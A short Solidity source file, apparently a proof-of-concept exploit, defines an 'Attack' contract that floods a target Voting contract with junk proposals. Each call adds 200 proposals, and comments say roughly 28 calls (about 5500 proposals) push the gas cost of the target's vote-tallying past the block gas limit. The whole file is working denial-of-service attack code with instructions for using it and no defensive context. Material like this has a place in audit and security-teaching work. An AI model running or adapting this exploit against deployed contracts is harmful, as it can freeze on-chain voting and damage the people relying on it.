contract Attack {
    Voting public voting;

    constructor(address _votingAddress) {
        voting = Voting(_votingAddress);
    }

    //Accourding to calculation, you need around 5500 proposals to reach 15M gas in votesTallied
    //You need to call this function 28 times
    function attackStep() external {
        // 200 iterations = 5 680 833 gas
        for(uint i=0; i<200; i++)
            voting.registerProposals("attack");
    }

}
